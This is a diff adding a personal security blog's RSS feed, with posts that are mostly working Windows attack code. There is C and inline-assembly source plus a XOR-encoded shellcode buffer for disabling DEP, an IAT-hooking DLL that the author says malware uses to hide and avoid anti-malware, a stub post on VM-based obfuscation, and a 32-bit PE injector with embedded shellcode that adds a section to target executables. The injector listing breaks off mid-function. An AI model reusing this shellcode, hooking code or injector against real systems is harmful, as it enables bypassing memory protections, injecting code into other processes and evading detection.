@@ -1,0 +1,1140 @@
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Mohamed Ali Mrabet ]]></title><description><![CDATA[Thoughts, stories and ideas.]]></description><link>http://localhost:2368/</link><image><url>http://localhost:2368/favicon.png</url><title>Mohamed Ali Mrabet </title><link>http://localhost:2368/</link></image><generator>Ghost 2.26</generator><lastBuildDate>Thu, 01 Aug 2019 16:51:33 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[Win 32-bit DISABLE DEP Polymorphic ShellCode]]></title><description><![CDATA[<!--kg-card-begin: markdown--><p>Research has proven that shellcode injection when DEP is enabled on (/NXCOMPAT flag ) a target process has always been a hurdle since it marks a memory page as non-executable region,  thus preventing arbitrary code from being executed. To get around such a problem , we simply use <strong>SetProcessDEPPolicy()</strong> API to disable</p>]]></description><link>http://localhost:2368/win-32-bit-disable-dep-polymorphic-shellcode/</link><guid isPermaLink="false">5d42f2caafb0373528abf209</guid><dc:creator><![CDATA[mohamed ali MRABET]]></dc:creator><pubDate>Thu, 01 Aug 2019 14:28:41 GMT</pubDate><content:encoded><![CDATA[<!--kg-card-begin: markdown--><p>Research has proven that shellcode injection when DEP is enabled on (/NXCOMPAT flag ) a target process has always been a hurdle since it marks a memory page as non-executable region,  thus preventing arbitrary code from being executed. To get around such a problem , we simply use <strong>SetProcessDEPPolicy()</strong> API to disable DEP. While this not a new trick by any means , but the technique neither well  documented nor a proof of concept is available .<br>
+Technically, for a shellcode to be considered universal , it must be Position-independent code and it ought not be tied up to a hardcoded addresses as they differ from windows version to another.<br>
+In the matter of code-relocation , the shellcode starts off by getting <strong>GetprocAddress()</strong> api address in the EAT(Export address table) of kernel32.dll module which is located through <em>ldr_data_table_entry</em> doubly linked list in the PEB structure .</p>
+<!--kg-card-end: markdown--><!--kg-card-begin: html--><pre class="line-numbers"><code class="lang-c">
+
+#include "stdafx.h"
+#include <windows.h>
+
+//don't optimize my code , leave the opcodes unaltered !!
+#pragma optimize("",off)
+
+
+typedef struct
+{
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+
+}  UNICODE_STRING;
+
+typedef struct _LDR_DATA_TABLE_ENTRY
+{
+    LIST_ENTRY InLoadOrderLinks;
+    LIST_ENTRY InMemoryOrderLinks;
+    LIST_ENTRY InInitializationOrderLinks;
+    PVOID DllBase;
+    PVOID EntryPoint;
+    ULONG SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+    ULONG Flags;
+    WORD LoadCount;
+    WORD TlsIndex;
+    union
+    {
+        LIST_ENTRY HashLinks;
+        struct
+        {
+            PVOID SectionPointer;
+            ULONG CheckSum;
+        };
+    };
+    union
+    {
+        ULONG TimeDateStamp;
+        PVOID LoadedImports;
+    };
+
+    PVOID PatchInformation;
+    LIST_ENTRY ForwarderLinks;
+    LIST_ENTRY ServiceTagLinks;
+    LIST_ENTRY StaticLinks;
+} LDR_DATA_TABLE_ENTRY;
+
+
+
+int _tmain(int argc, _TCHAR* argv[])
+{
+
+typedef long long int (  WINAPI * ProcAddress)( IN HMODULE  , IN LPCSTR ) ;
+typedef HMODULE ( WINAPI * LoadLibrar)(IN LPCTSTR lpFileName) ;
+typedef int (WINAPI * SetProcessDEPPolicyy)( IN int flag) ;
+
+UNICODE_STRING  sh ;
+    WCHAR kernel_32dll[13] ;
+    kernel_32dll[0] ='k' ;
+    kernel_32dll[1] ='e' ;
+    kernel_32dll[2] ='r' ;
+    kernel_32dll[3] ='n';
+    kernel_32dll[4] ='e';
+    kernel_32dll[5] ='l';
+    kernel_32dll[6] ='3';
+    kernel_32dll[7] ='2';
+    kernel_32dll[8] ='.';
+    kernel_32dll[9] ='d';
+    kernel_32dll[10]='l';
+    kernel_32dll[11]='l';
+    kernel_32dll[12]= 0x0;
+
+    /*well , this is the weirdest thing I have ever seen in programming .
+      Using Gcc Compiler , It does work if and only if the function pointer(myGetProcAdd) is declared as static variable,
+      whereas the  myloadLibrary function pointer works with no issues (without 'static' prefix),
+      during the run-time , it generates the NTSTATUS "PRIVILGED_INSTRUCTION_ERROR".
+      This crap took me nearly the whole day to work it out , and still have no idea from where the error stems !!
+      !! such a HEADACHE!!
+     */
+/*static*/ ProcAddress myGetProcAdd ;
+LoadLibrar  myLoadLibrary ;
+SetProcessDEPPolicyy mySetProcessDEPPolicy ;
+sh.Buffer = kernel_32dll;
+sh.Length = 0x0 ;
+sh.MaximumLength = 13 ;
+int i = 0 ;
+PVOID Kernel32_DllBase = 0 ;
+IMAGE_DOS_HEADER * idh = 0 ;
+IMAGE_NT_HEADERS * inh = 0 ;
+DWORD  export_va = 0 ;
+LDR_DATA_TABLE_ENTRY * ldte = 0x0 ;
+
+__asm
+{
+    mov eax,dword ptr fs:[0x30]
+    mov eax,dword ptr [eax+0xC]
+    mov ebx,dword ptr [eax+0xC] //ldr_data_table_entry
+    mov ss:[ldte] , ebx
+} ;
+
+
+while(1)
+{
+    for(i = 0 ; i < 12 ; i++)
+    {
+        if(sh.Buffer[i] != ldte->BaseDllName.Buffer[i])
+        {
+            break ;
+        }
+    }
+    if (i == 12 )
+    {
+        Kernel32_DllBase = ldte->DllBase ;
+        break ;
+    }
+    ldte = (LDR_DATA_TABLE_ENTRY * )ldte->InLoadOrderLinks.Flink ;
+}
+
+idh = (IMAGE_DOS_HEADER * )Kernel32_DllBase ;
+inh = (IMAGE_NT_HEADERS * )((DWORD)Kernel32_DllBase + idh->e_lfanew );
+export_va =  inh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress ;
+
+IMAGE_EXPORT_DIRECTORY * iid = (IMAGE_EXPORT_DIRECTORY * )((DWORD) Kernel32_DllBase + export_va );
+
+int *  AddressOfNames =(int * ) ((DWORD)Kernel32_DllBase + iid->AddressOfNames) ;
+int  * AddresseOffuncs =(int * ) ((DWORD)Kernel32_DllBase + iid->AddressOfFunctions );
+
+char getprocaddress[15] ;
+getprocaddress[0] = 'G';
+getprocaddress[1] = 'e';
+getprocaddress[2] = 't';
+getprocaddress[3] = 'P';
+getprocaddress[4] = 'r';
+getprocaddress[5] = 'o';
+getprocaddress[6] = 'c';
+getprocaddress[7] = 'A';
+getprocaddress[8] = 'd';
+getprocaddress[9] = 'd';
+getprocaddress[10] = 'r';
+getprocaddress[11] = 'e';
+getprocaddress[12] = 's';
+getprocaddress[13] = 's';
+getprocaddress[14] = 0x0;
+
+char loadlibrarya[13] ;
+loadlibrarya[0] = 'L';
+loadlibrarya[1] = 'o';
+loadlibrarya[2] = 'a';
+loadlibrarya[3] = 'd';
+loadlibrarya[4] = 'L';
+loadlibrarya[5] = 'i';
+loadlibrarya[6] = 'b';
+loadlibrarya[7] = 'r';
+loadlibrarya[8] = 'a';
+loadlibrarya[9] = 'r';
+loadlibrarya[10] = 'y';
+loadlibrarya[11] = 'A';
+loadlibrarya[12] = 0x0 ;
+
+int   loadisfound = 0 ,getprocisfound = 0, len = 15, j = 0 ;
+char * kernel32_temp = 0x0 ;
+char * temp = getprocaddress;
+
+//Can Ya Dig It :P !!
+while(i < iid->NumberOfNames )
+{
+
+    if(getprocisfound == 1)
+    {
+        len  = 13 ;
+        temp = loadlibrarya ;
+    }
+    kernel32_temp = (char * )( (DWORD)Kernel32_DllBase + AddressOfNames[i] );
+    for (j = 0; j < len ; j++ )
+    {
+        if(temp[j] != *(kernel32_temp+j))
+            break ;
+    }
+    if(j == len )
+    {
+        if(getprocisfound == 1 )
+        {
+            myLoadLibrary = (LoadLibrar)((DWORD)Kernel32_DllBase + AddresseOffuncs[i]);
+            loadisfound = 1 ;
+            break ;
+        }
+        else
+        {
+            getprocisfound = 1 ;
+            myGetProcAdd =(ProcAddress)((DWORD)Kernel32_DllBase + (DWORD)AddresseOffuncs[i+1]) ;
+        }
+    }
+    i++ ;
+}
+
+char DEP[20] ;
+DEP[0] = 'S' ;
+DEP[1] = 'e' ;
+DEP[2] = 't' ;
+DEP[3] = 'P' ;
+DEP[4] = 'r' ;
+DEP[5] = 'o' ;
+DEP[6] = 'c' ;
+DEP[7] = 'e' ;
+DEP[8] = 's' ;
+DEP[9] = 's' ;
+DEP[10] = 'D' ;
+DEP[11] = 'E' ;
+DEP[12] = 'P' ;
+DEP[13] = 'P' ;
+DEP[14] = 'o' ;
+DEP[15] = 'l' ;
+DEP[16] = 'i' ;
+DEP[17] = 'c' ;
+DEP[18] = 'y' ;
+DEP[19] = 0x0 ;
+
+//manual import of SetProcessDEP API !!
+mySetProcessDEPPolicy = (SetProcessDEPPolicyy)myGetProcAdd((HMODULE)Kernel32_DllBase,DEP);
+
+// mySetProcessDEPPolicy(0);
+mySetProcessDEPPolicy(0) ;
+//disable DEP for the cuurent Process !!
+
+return 0;
+}
+</windows.h></code></pre><!--kg-card-end: html--><!--kg-card-begin: markdown--><p>The following shellcode implements an encoder which transforms this code into polymorphic and decrypts in the run-time :</p>
+<!--kg-card-end: markdown--><!--kg-card-begin: html--><pre class="line-numbers"><code class="lang-c">
+#include <windows.h>
+
+
+// this is the decoder stub , which the shellcode  is preceded with , it simply xor's every 4 bytes with 'DEADC0DE' 
+
+//----------------------------
+__asm 
+	{   
+	        call myEIP 
+myEIP : 
+	        pop edx  //get EIP 
+            add edx , 0x26  //  (decoder)EIP +  sizeof(decoder) = addr of shellcode :p  
+		xor eax , eax 
+		xor ecx , ecx 
+		
+decoder:	
+	    mov eax , dword ptr [edx  + ecx]	 
+        xor eax , 0xDEADC0DE  //decrypt 
+        mov ebx ,  edx
+		add ebx , ecx 
+		mov dword ptr [ebx] , eax 
+        add ecx , 4
+		cmp ecx , 0x450 
+		jz done  
+		jmp decoder
+done :     
+	}
+//----------------------------------	
+
+int main() 
+
+{ 
+
+
+ //0x450 bytes !
+ char DisableDEPPolymorphic3vilC0de[] = 
+   "\xE8 \x00\x00\x00\x00\x5A\x83\xC2\x26\x33\xC0\x33\xC9\x8B\x81\x00\x50\x34\x01"
+"\x35\xDE\xC0\xAD\xDE\x8B\xDA\x03\xD9\x89\x03\x83\xC1\x04\x81\xF9\x50\x04\x00"
+"\x00 \x74\x02\xEB\xE2" // decoder 
+//shellcode 
+"\x8b\x26\x2c\x5f\x32\xb5\xc2\xde\xde\xfe\x96\x89\x53\x10\x28\x23\x21\x52\x79\x58"
+"\xde\xad\xc0\x66\x12\x61\xc\x12\x2d\x6\x78\xb5\xde\xad\xc0\xb8\x57\xe8\x10\x66"
+"\xbb\xad\xc0\xde\xb8\x24\x85\xc\x66\xdf\xc0\xde\xde\xcb\x49\x9b\xa\x15\xae\xde"
+"\xde\xad\xa6\x57\x9b\x7b\x78\xbb\xde\xad\xc0\xb8\x57\xe8\x18\x66\xb2\xad\xc0\xde"
+"\xb8\x24\x85\x4\x66\x9e\xc0\xde\xde\xcb\x49\x9b\x2\x15\xf2\xde\xde\xad\xa6\x57"
+"\x9b\x73\x78\xf0\xde\xad\xc0\xb8\x57\xe8\x20\x66\xba\xad\xc0\xde\xb8\x24\x85\x3c"
+"\x66\xc1\xc0\xde\xde\xcb\x49\x9b\x3a\x15\xac\xde\xde\xad\xa6\x57\x9b\x4b\xf3\x1e"
+"\xb8\x24\x85\x36\x53\xe8\x10\x57\x9b\x55\xf3\x1e\xb8\x24\x85\x2a\x66\xb7\xc0\xde"
+"\xde\xcb\x49\x9b\x28\x6a\x85\x7e\xde\xad\xc0\xde\x19\xe8\x54\xde\xde\xad\xc0\x19"
+"\x9b\x25\xc0\xde\xde\xad\x7\x5b\xa2\x52\x3f\x21\xde\xad\xc0\xde\x19\x28\xb0\x21"
+"\x21\x52\xc0\xde\xde\xad\x7\x5b\xba\x52\x3f\x21\xde\xad\xc0\xde\xba\xc\xf0\xde"
+"\xde\xad\x4b\x9e\xd2\x26\x98\xd2\x57\x30\xa4\x21\x21\x52\x78\xdf\xde\xad\xc0\x5b"
+"\x1e\xd9\x9e\x19\x9b\xd\xc0\xde\xde\xad\x2b\xd7\x55\xe8\x60\x5d\x1e\xac\x49\x9b"
+"\x7e\x2e\xbd\x7e\xd2\xd0\xe2\x55\x9b\xd\x4b\x93\x26\xa2\x77\xca\x9f\x26\x45\xba"
+"\x21\x52\x3f\x55\x96\x9d\x4b\x9b\x7e\xa2\x77\xd2\x9f\x96\x11\xaa\xdc\x46\xc2\x35"
+"\x11\x2e\xbd\x7e\xd2\xd8\xce\x55\x5b\xc9\x3f\x21\x21\x26\x88\xc6\x57\xe0\x54\x35"
+"\xce\x26\x45\xba\x21\x52\x3f\x55\xd6\x24\x4d\xba\x21\x52\x3f\x35\x47\x26\x85\x4a"
+"\x57\xe8\x48\x55\x9b\x25\x4b\x93\x4a\xae\x88\xe2\x57\x20\xbc\x21\x21\x52\x4b\x5b"
+"\xa2\x52\x3f\x21\x55\xe5\xb8\x57\x53\xdd\x3f\x21\x21\x26\x85\x4a\xdd\x28\xb0\x21"
+"\x21\x52\x49\x5b\x86\x52\x3f\x21\x55\x28\x98\x21\x21\x52\x4b\x93\x4a\xae\x88\xfe"
+"\x57\x20\x8c\x21\x21\x52\x4b\x5b\x86\x52\x3f\x21\x55\xe0\x54\xdd\x96\xb1\x49\x53"
+"\x9e\x52\x3f\x21\x18\x28\xe8\x21\x21\x52\x87\x18\x5b\x84\x3f\x21\x21\xc8\x6\x5b"
+"\xf4\x52\x3f\x21\xaa\x6b\x45\xf5\x21\x52\x3f\x8e\x18\x28\xec\x21\x21\x52\xb2\x18"
+"\x5b\x80\x3f\x21\x21\xc2\x6\x5b\xf0\x52\x3f\x21\xbd\x6b\x45\xf1\x21\x52\x3f\x9f"
+"\x18\x28\xf0\x21\x21\x52\xa4\x18\x5b\x9c\x3f\x21\x21\xc9\x6\x5b\xec\x52\x3f\x21"
+"\xac\x6b\x45\xed\x21\x52\x3f\xbb\x18\x28\xf4\x21\x21\x52\xb3\x18\x5b\x98\x3f\x21"
+"\x21\xde\x6\x5b\xe8\x52\x3f\x21\xde\x6b\x45\xce\x21\x52\x3f\x92\x18\x28\xd1\x21"
+"\x21\x52\xaf\x18\x5b\xbf\x3f\x21\x21\xcc\x6\x5b\xcd\x52\x3f\x21\xba\x6b\x45\xca"
+"\x21\x52\x3f\x92\x18\x28\xd5\x21\x21\x52\xa9\x18\x5b\xbb\x3f\x21\x21\xcf\x6\x5b"
+"\xc9\x52\x3f\x21\xac\x6b\x45\xc6\x21\x52\x3f\xbf\x18\x28\xd9\x21\x21\x52\xb2\x18"
+"\x5b\xb7\x3f\x21\x21\xd4\x6\x5b\xc5\x52\x3f\x21\x9f\x6b\x45\xc2\x21\x52\x3f\xde"
+"\x19\x28\xc4\x21\x21\x52\xc0\xde\xde\xad\x7\x5b\x26\x53\x3f\x21\xde\xad\xc0\xde"
+"\x19\x28\x2c\x20\x21\x52\xcf\xde\xde\xad\x7\x5b\x3e\x53\x3f\x21\xde\xad\xc0\xde"
+"\x19\x28\x14\x20\x21\x52\xc0\xde\xde\xad\x4d\x5b\xf6\x52\x3f\x21\x57\x28\x8\x20"
+"\x21\x52\x4b\x5b\x86\x52\x3f\x21\x55\xe0\x60\xe5\x96\xb5\xcf\x5d\x3b\xad\xc0\xde"
+"\x5d\x10\x38\x20\x21\x52\xc1\xab\xc8\x6a\x45\x32\x20\x52\x3f\xd3\xde\xad\xc0\x53"
+"\x5b\xbd\x3f\x21\x21\x24\x45\x16\x20\x52\x3f\x55\x9b\xd\x4b\x53\x92\x52\x3f\x21"
+"\x55\xf8\x54\xdd\xca\x2c\x49\x4b\xa\x53\x3f\x21\x19\x28\x20\x20\x21\x52\xc0\xde"
+"\xde\xad\x2b\xd1\x55\x28\x20\x20\x21\x52\x43\x1e\xdf\x24\x45\x3e\x20\x52\x3f\x55"
+"\x5b\x4d\x3e\x21\x21\x96\x45\x32\x20\x52\x3f\xa3\xf8\x26\x45\x16\x20\x52\x3f\xdd"
+"\x5b\x4d\x3e\x21\x21\xa2\x7e\xd6\x55\x38\x14\x20\x21\x52\xc3\x4b\x3e\x53\x3f\x21"
+"\xd1\x13\xc2\xe5\x16\xd9\xc2\x35\xdc\x46\x7d\x55\x5b\x4d\x3e\x21\x21\x96\x45\x32"
+"\x20\x52\x3f\xab\x98\x2e\x7d\x26\x20\x52\x3f\xdf\xab\x8d\x4b\x9b\x7e\x26\x4d\x9e"
+"\x21\x52\x3f\x55\x8b\x39\xc3\xca\x5f\x24\x95\x66\x19\x28\xc4\x21\x21\x52\xc1\xde"
+"\xde\xad\x2b\xf3\x35\xb0\x7\x5b\x26\x53\x3f\x21\xdf\xad\xc0\xde\x55\xe8\x60\x55"
+"\x53\xed\x3f\x21\x21\x26\x95\x4a\xdd\xf9\x41\xda\x57\xf8\x4\x55\x9b\xd\x43\x1e"
+"\xdf\x24\x85\x7e\x37\xa4\x3f\x21\x21\x6b\x45\x72\x20\x52\x3f\x8d\x18\x28\x6d\x20"
+"\x21\x52\xa5\x18\x5b\x3\x3e\x21\x21\xd9\x6\x5b\x71\x53\x3f\x21\x8e\x6b\x45\x6e"
+"\x20\x52\x3f\xac\x18\x28\x71\x20\x21\x52\xaf\x18\x5b\x1f\x3e\x21\x21\xce\x6\x5b"
+"\x6d\x53\x3f\x21\xbb\x6b\x45\x6a\x20\x52\x3f\xad\x18\x28\x75\x20\x21\x52\xb3\x18"
+"\x5b\x1b\x3e\x21\x21\xe9\x6\x5b\x69\x53\x3f\x21\x9b\x6b\x45\x66\x20\x52\x3f\x8e"
+"\x18\x28\x79\x20\x21\x52\x90\x18\x5b\x17\x3e\x21\x21\xc2\x6\x5b\x65\x53\x3f\x21"
+"\xb2\x6b\x45\x62\x20\x52\x3f\xb7\x18\x28\x7d\x20\x21\x52\xa3\x18\x5b\x13\x3e\x21"
+"\x21\xd4\x6\x5b\x61\x53\x3f\x21\xde\x26\x34\x53\x5b\x1\x3e\x21\x21\xfd\x4b\x93"
+"\x4a\xfc\x3f\x8b\x1a\x96\x34\x4e\x4e\x3d\x50\x4e\x57\xe8\x6c\x55\x2a\xc7\xc0\x21"
+"\x8b\x1\x50\x4e" ;
+ 
+ // to test the shellcode ,it is recommended to use virtualalloc API with "EXECUTE" attribute is set !!
+ 
+(*(int(*)()) DisableDEPPolymorphic3vilC0de)();
+
+return 0 ;
+}
+</windows.h></code></pre><!--kg-card-end: html-->]]></content:encoded></item><item><title><![CDATA[IAT hook]]></title><description><![CDATA[<!--kg-card-begin: markdown--><p>This tool , in its simplest form , hooks an API entry address (Function pointer) in an IAT , and overwrites it with a custom implementation . Technically , this code must be compiled in a DLL , then injected in address space of process (e.g with SetWindowsHookEx( ) ),  which is employed to locate the  RVA</p>]]></description><link>http://localhost:2368/iat-hook/</link><guid isPermaLink="false">5d42f4bdafb0373528abf239</guid><dc:creator><![CDATA[mohamed ali MRABET]]></dc:creator><pubDate>Thu, 01 Aug 2019 14:28:26 GMT</pubDate><content:encoded><![CDATA[<!--kg-card-begin: markdown--><p>This tool , in its simplest form , hooks an API entry address (Function pointer) in an IAT , and overwrites it with a custom implementation . Technically , this code must be compiled in a DLL , then injected in address space of process (e.g with SetWindowsHookEx( ) ),  which is employed to locate the  RVA of the import table   (<em>DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress</em>) and eventually gets the entry in <em>FirstThunk</em> linked list to change the value of <em>u1.Function</em> to the hooking function. For all practical purposes , IAT hooking comes handy in variety of situations : -  During unpacking phase (e.g : hooking ExitProcess() ) . - Malwares often take advantage of it to hide their presence in the system. - Intercepting API calls and parameters. - Avoids anti-malware detection mechanism .</p>
+<!--kg-card-end: markdown--><!--kg-card-begin: html--><pre class="line-numbers"><code class="lang-c">
+#include "main.h"
+#include <\windows.h\>
+#include <\stdio.h\>
+#include <\stdlib.h\>
+#include <\string.h\>
+
+// a sample exported function
+
+
+inline void  WINAPI trampoline()
+{
+
+    fprintf(stdout,"%s \n ","Hooked !! ");
+
+}
+
+void HookIAT (const char  * api , DWORD  HookFuncAddr )
+{
+
+    IMAGE_DOS_HEADER * idh = NULL ;
+    HMODULE CurrentExe = GetModuleHandle(NULL);
+    DWORD Protect = 0;
+    IMAGE_NT_HEADERS * inh = NULL ;
+    DWORD t = 0 ;
+    IMAGE_THUNK_DATA * itd ;
+    int j = -1, i  = 0;
+    IMAGE_THUNK_DATA * itdf ;
+    idh = (IMAGE_DOS_HEADER * )CurrentExe ;
+
+
+    if(idh->e_magic != 0x5a4d )
+    {
+        ExitProcess(-1) ;
+    }
+    inh = (IMAGE_NT_HEADERS * )((DWORD)CurrentExe  + (DWORD)idh->e_lfanew ) ;
+
+    if(inh->Signature != 0x4550 )
+    {
+        ExitProcess(-1);
+    }
+    // Get the Virtaul address of import adress table !!
+    IMAGE_IMPORT_DESCRIPTOR * va_import = (IMAGE_IMPORT_DESCRIPTOR * )((DWORD)inh->OptionalHeader.ImageBase + (DWORD)inh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress );
+
+     itd = (IMAGE_THUNK_DATA * )( (DWORD)CurrentExe + va_import[0].OriginalFirstThunk );
+    // contains the adresses of the imported APIs
+     itdf = (IMAGE_THUNK_DATA * )( (DWORD)CurrentExe + va_import[0].FirstThunk ) ;
+
+
+    while(va_import[i].Characteristics != 0)
+    {
+
+        j = -1 ;
+
+        while(itd[++j].u1.Function != 0)
+        {
+
+            if(strcmp((const char *)api , (const char * )((DWORD) CurrentExe + (DWORD)(itd[j].u1.ForwarderString + 2)) ) == 0)
+            {
+
+                if(!VirtualProtect(&itdf[j].u1.Function, sizeof(LPVOID), PAGE_READWRITE, &Protect) )
+                {
+                    ExitProcess(-1) ;
+                }
+
+                 itdf[j].u1.Function = (DWORD )HookFuncAddr;
+
+
+                if(!VirtualProtect(&itdf[j].u1.Function, sizeof(LPVOID), Protect, &t) )
+                {
+                    ExitProcess(-1) ;
+                }
+
+            }
+        }
+
+        i++ ;
+        itd = (IMAGE_THUNK_DATA * )((DWORD)CurrentExe + va_import[i].OriginalFirstThunk );
+
+        itdf = (IMAGE_THUNK_DATA * )((DWORD)CurrentExe + va_import[i].FirstThunk );
+    }
+}
+
+
+
+extern "C" DLL_EXPORT BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+    switch (fdwReason)
+    {
+
+    case DLL_PROCESS_ATTACH:
+        // attach to process
+        // return FALSE to fail DLL load
+
+        HookIAT("MessageBoxA",(DWORD  )trampoline) ;
+
+ /// the following api will be hooked and the trampoline() function will be executed instead !!
+
+        MessageBoxA(NULL,"L0phtTn","HookMe",0);
+
+        break;
+
+    case DLL_PROCESS_DETACH:
+        // detach from process
+        break;
+
+    case DLL_THREAD_ATTACH:
+        // attach to thread
+        break;
+
+    case DLL_THREAD_DETACH:
+        // detach from thread
+        break;
+
+    }
+    return TRUE; // succesful
+}
+</\string.h\></\stdlib.h\></\stdio.h\></\windows.h\></code></pre><!--kg-card-end: html-->]]></content:encoded></item><item><title><![CDATA[My Simple Virtual Machine]]></title><description><![CDATA[<!--kg-card-begin: markdown--><p>In the Interest of binary obfuscation , Programmers often embed a virtual machine in their programs due to its tedious analysis and highly obfuscated routines which make use of a custom instruction set , hence this leaves no clue for the analyst as to what the binary workflow intends to perform and</p>]]></description><link>http://localhost:2368/my-simple-virtual-machine/</link><guid isPermaLink="false">5d42f5edafb0373528abf25b</guid><dc:creator><![CDATA[mohamed ali MRABET]]></dc:creator><pubDate>Thu, 01 Aug 2019 14:28:06 GMT</pubDate><content:encoded><![CDATA[<!--kg-card-begin: markdown--><p>In the Interest of binary obfuscation , Programmers often embed a virtual machine in their programs due to its tedious analysis and highly obfuscated routines which make use of a custom instruction set , hence this leaves no clue for the analyst as to what the binary workflow intends to perform and will unquestionably slow down reverse engineering tasks .Accordingly , this is what pushed me to code my own register-based virtual machine which comprises of 17 virtual instructions (<em>MOV ,CALL, XOR, JMP, RET, CMP, HALT... etc ...</em>) , virtual stack(<em>because of the 'CALL' instruction</em>) and 10 virtual registers(<em>R1 ,R2 ,SP ,BP ..etc</em> ).<br>
+In abstract terms  ,  the virtual instructions are 4 bytes-aligned , each of which holds an operand and addressing mode , displacement and immediate value and the maximum value that a register can have is 255 .<br>
+Technically speaking , the VCPU is structured as the following :</p>
+<ul>
+<li>Virtual Stack</li>
+<li>Eflags</li>
+<li>Virtual Registers</li>
+<li>Program Counter</li>
+<li>Base address</li>
+</ul>
+<p>And since the virtual instruction is 4-byte length , thus the encoding scheme is conceived in this fashion :</p>
+<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[32-bit PE injector]]></title><description><![CDATA[<!--kg-card-begin: html-->I am releasing my new tool PEInject, It does inject some shellcodes into a desired process . <br>Currently , it does only work with 32-bit executables , please don't expect it to work flawlessly on all targets. It may fail if the target is loaded with /DYNAMICBASE module or DEP is permanently active]]></description><link>http://localhost:2368/32-bit-pe-injector/</link><guid isPermaLink="false">5d42f18dafb0373528abf1fb</guid><dc:creator><![CDATA[mohamed ali MRABET]]></dc:creator><pubDate>Thu, 01 Aug 2019 14:05:53 GMT</pubDate><content:encoded><![CDATA[<!--kg-card-begin: html-->I am releasing my new tool PEInject, It does inject some shellcodes into a desired process . <br>Currently , it does only work with 32-bit executables , please don't expect it to work flawlessly on all targets. It may fail if the target is loaded with /DYNAMICBASE module or DEP is permanently active on it. <br> On Windows XP it allocates enough room for the shellcode and executes it with 'CreateRemoteThread'. Because On Windows Vista/Win7/Win8.1 the'CreateRemoteThread' does not work smoothly due to some additional protection mechanisms ,so the injector creates an extra section named "L0phtTN" and loads it with a shellcode and then jumps back to the OEP .<!--kg-card-end: html--><!--kg-card-begin: html--><pre class="line-numbers"><code class="lang-c">
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <tlhelp32.h>
+#include <process.h>
+#include <winbase.h>
+#include <imagehlp.h>
+
+
+// simple shellcode that displays msgBox  "Pwned by l0pht_TN" preceded by pushad and followed popad and jmp opcodes
+
+static  char  l0phtTN_shellcode[] =
+    "\x60\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
+    "\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
+    "\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
+    "\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
+    "\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
+    "\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
+    "\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
+    "\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
+    "\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
+    "\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
+    "\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
+    "\x32\x2e\x64\x68\x75\x73\x65\x72\x88\x5c\x24\x0a\x89\xe6\x56"
+    "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52"
+    "\xe8\x61\xff\xff\xff\x68\x64\x21\x21\x58\x68\x70\x77\x6e\x65"
+    "\x31\xdb\x88\x5c\x24\x07\x89\xe3\x68\x4e\x58\x20\x20\x68\x70"
+    "\x68\x74\x54\x68\x6f\x20\x4c\x30\x68\x74\x7a\x20\x74\x68\x47"
+    "\x72\x65\x65\x31\xc9\x88\x4c\x24\x11\x89\xe1\x31\xd2\x52\x53"
+    "\x51\x52\xff\xd0\x31\xc0\x50\x61\xe9";    // put \xff\x55\x08 before /0x61 / 0xe9 if you desire to exitprocess() and not return to the OEP
+
+/*
+the following func adds a section named "L0phtTN" to the desired target .
+if the executable(target) is packed , or ASLR and DEP are active on it
+then the process injection would fail !!
+*/
+BOOL AddL0phtTnSection(char * path )
+{
+    // load the target
+    HANDLE target =  CreateFile(path, GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE  ,NULL,OPEN_EXISTING,NULL,NULL);
+    if(target ==  INVALID_HANDLE_VALUE )
+    {
+        perror("Error in CreateFile()");
+        ExitProcess(-1);
+
+    }
+    DWORD  target_size = 0 ;
+// get the executable's size
+    target_size =  GetFileSize(target,0);
+    if(target_size == 0)
+    {
+        perror("Error in GetFileSize()");
+        ExitProcess(-1);
+    }
+
+    IMAGE_DOS_HEADER IDH ;
+    unsigned int n = 0 ;
+    //read the DOS_header
+    if(!ReadFile(target,&IDH,sizeof(IMAGE_DOS_HEADER),&n,NULL))
+    {
+        perror("Error in ReadFile() (IMAGE_DOS_HEADER) ");
+        ExitProcess(-1);
+    }
+    // checks whether is is a valid executable
+    if(IDH.e_magic != IMAGE_DOS_SIGNATURE)
+    {
+        perror("invalid DOS signture");
+        ExitProcess(-1);
+    }
+
+    IMAGE_NT_HEADERS INH = {0};
+    //sets the file pointer to the begginning of the NT header using e_lfanew value (which in turn points to it)
